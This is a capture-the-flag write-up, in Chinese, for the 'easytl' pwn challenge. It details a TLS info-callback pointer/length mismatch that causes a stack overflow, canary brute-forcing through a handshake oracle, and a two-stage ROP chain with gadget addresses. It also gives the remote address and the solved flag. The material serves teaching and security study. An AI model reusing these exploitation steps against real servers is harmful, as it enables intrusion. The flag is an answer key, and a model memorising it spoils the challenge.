# 强网杯 2026 - easytl Writeup

## 0x00 题目信息

- 题目：easytl（Pwn，100 分）
- 描述：“一个正常的服务器，快来试试吧。”
- 远程：`nc 47.105.112.170 1443`（另有 2443/3443/4443/5443 多实例）
- 附件：`easytl_536a482cd0b0b2446ec6be3ac06e9487.zip`，内含 `easytl`、`server.crt`、`server.key`
- Flag：`flag{e17a75032670d5df9a28077b982b0d5d}`

## 0x01 初步分析

`easytl` 是静态链接、strip 的 64 位 ELF：

```
ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

开启的保护：Canary、NX，非 PIE（EXEC，基址固定 0x400000）；静态包含完整 OpenSSL 与 glibc，没有系统 libc 依赖。

直接 nc 端口没有 banner，连接立即断开。用 openssl 探测发现 1443 是 TLS 服务，证书为 `O=QWB2026, CN=qiangwangbei.com`（自签名），说明题目是“在 TLS 握手流程里做文章”。

## 0x02 反汇编：TLS 配置与协议

主程序硬编码监听 1443，加载同目录 `server.crt` / `server.key`，注册了三个关键回调：

1. **PSK 查找回调** `0x402dbb`
   - 要求 PSK identity 的 `strlen == 0x20` 且前 32 字节等于
     `1401518dc5d7641ccd41593a5d812410`；
   - 用 `OPENSSL_hexstr2buf` 解析内置的 48 字节 secret：
     `c8ad2a35...6fd428`；
   - `PSK = HMAC-SHA512(secret, identity[0:32])`（64 字节）；
   - 构造 `SSL_SESSION`：master key = PSK，cipher = `TLS_AES_256_GCM_SHA384`，版本 TLS1.3。
   由于 secret 与 identity 前缀都写死在二进制里，客户端可以算出同一 PSK，**完成合法的 TLS1.3 PSK 握手**。

2. **SNI 回调** `0x40320a`
   - `SSL_get_servername` 后把 SNI 字符串 `strlen` 长度存入全局 `0x970f58`，内容 strdup 到 `0x970f50`。

3. **Info 回调** `0x4030d5`（漏洞所在）

```
info_cb(ssl, where, ret):
  if (where & 0x2002) {           // SSL_CB_ACCEPT_EXIT
      g_ptr = identity_ptr ? identity_ptr : sni_ptr;
      g_len = identity_len(0x20);
      if (sni_len) g_len = sni_len;   // ★ 长度被 SNI 长度覆盖
  }
  if (where & 0x4004) {           // SSL_CB_READ_ALERT
      g_ptr = identity_ptr;           // ★ 指针又换回 identity
      if (identity_len == 0x20)
          print_sni();                // 用 g_ptr + g_len
      write(raw_fd, "error", 5);
  }
```

`print_sni`（`0x40304d`）非常直接：

```c
char buf[0x50];
memset(buf, 0, 0x50);
memcpy(buf, g_ptr, g_len);   // g_ptr=identity堆块, g_len=SNI长度(≤255)
printf("%s\n", buf);
```

正常握手结束时（ACCEPT_EXIT）`g_len` 被设成 **SNI 长度**；随后读到一个 alert（READ_ALERT）时 `g_ptr` 被设成 **PSK identity 堆块指针**，而 `g_len` 没有更新 —— 指针与长度来自两个不同对象。

PSK identity 是长度前缀的二进制串，可以带 `\x00` 和任意字节；而 SNI 只负责控制拷贝长度（max 255）。于是形成 **源数据完全可控、长度可控的栈溢出**：

```
buf            rbp-0x60
canary         rbp-0x08   (buf+0x58)
saved rbp      rbp
return addr    rbp+0x08   (buf+0x68)
```

## 0x03 Canary 爆破

溢出发生在 info 回调里，如果 canary 被破坏，子进程在 `__stack_chk_fail` 直接 abort；如果猜对，回调继续执行 `write(fd, "error", 5)`（直接写原始 socket，不经过 TLS）。这就是一个 1-bit 的 oracle。

爆破方法：

- identity = `magic(32) + "\x00" + filler`，在偏移 `0x58` 处放已恢复的 canary 前缀，偏移 `0x58+k` 放当前猜测字节；
- PSK identity 长度 = `0x59 + k`；
- SNI 长度也设为 `0x59 + k`，这样 `memcpy` 刚好覆盖 canary 的前 k+1 字节；
- canary 首字节固定 `0x00`，从第 1 字节开始逐字节爆破，猜对时收到 `error`。

每次尝试都是一次完整 TLS1.3 握手 + `close_notify` 触发 alert。服务端是 fork 模型，父进程长期存活，**所有连接共享同一个 canary**。

远程爆破结果：

```
00 cb 05 0b 73 dc cd 3a
```

## 0x04 两段式 ROP

溢出长度上限只有 255 字节，且 return address 只能吃下约 18 个 qword。采用 BSS 上二次加载 + 栈迁移：

**Stage 1**（放 identity 中，长度 0xb8）：

```
read(4, 0x979000, 0x100)   // glibc read wrapper @0x793b30
pop rbp; 0x979000
leave; ret                 // 迁移到 BSS
```

发送 order：握手成功后用 `SSL_shutdown` 发 close_notify → 服务端进入 info 回调 → 溢出 → ROP 的 `read(4, ...)` 阻塞；隔 300ms 再向原始 socket 发 0x100 字节的 stage2。

**Stage 2**（BSS 0x979000，0x100 字节，单条连接只 open 一个路径）：

```
close(3)                                // 保证 3 号 fd 空闲
open(path, 0)                           // syscall 2
read(3, 0x979300, 0x100)                // 打开成功时 open 必然返回 3
write(4, 0x979300, 0x100)               // 4 号 fd 就是 TLS socket，直接写回
```

注：最初把 5 个候选路径放在同一段 0x400 的 stage2 里，但远程读入可能被 TCP 分段截断，路径字符串落在未读到的尾部导致 open 全部失败；改为 0x100 单路径后稳定。按 `/flag → flag → /home/ctf/flag → ./flag → /flag.txt` 轮询，远程命中 cwd 下的 `flag`。

用到的 gadget / 函数：

| 用途 | 地址 |
| --- | --- |
| pop rdi ; ret | 0x4251bd |
| pop rsi ; ret | 0x5e9a79 |
| pop rdx ; ret | 0x52f0d2 |
| pop rax ; ret | 0x5f6c9a |
| pop rbp ; ret | 0x402262 |
| leave ; ret | 0x402db9 |
| syscall ; ret | 0x76e706 |
| read | 0x793b30 |
| write | 0x793c30 |
| close | 0x793800 |

关键点：handler 子进程的启动 fd 布局固定（0/1/2 标准流、3 是已关闭的 listen fd、4 是 accept 的 TLS socket），所以 `read/write` 直接使用 fd 4，`open` 返回 3。

## 0x05 拿到 Flag

```
$ ./exploit 47.105.112.170 1443 00cb050b73dccd3a 1
[*] stage1 len=184
[*] SSL_connect=1
[*] stage2 sent
...
flag{e17a75032670d5df9a28077b982b0d5d}
```

## 0x06 其他分析（未使用）

二进制命令协议 `add/update/show/delete/encrypt/decrypt` 中存在一个看起来很像预期漏洞的 double-free：update ID2 节点时会再次 free。但节点查找使用 `memcmp(node[0:15], input, 16)`，而 `add` 里的 `MD5_Final(node, ctx)` 恰好把 `MD5(data)` 写到了 `node[0:15]`（真正的 id 在 `node+0x20`）。也就是说链表键是 **MD5(data)**，`ID1/ID2` 特判分支需要 MD5 原像，实际不可达。该路径是干扰项，本题真正的漏洞是 TLS info 回调里的指针/长度错配。

## 0x07 文件

- `work/brute.c`：canary 爆破客户端（合法 TLS1.3 PSK 握手 + alert oracle）
- `work/exploit.c`：两段式 ROP 利用（参数：host port canary_hex mode）
- `work/client2.c`：调试用单次握手/触发客户端
- 附件：`easytl_536a482cd0b0b2446ec6be3ac06e9487.zip`
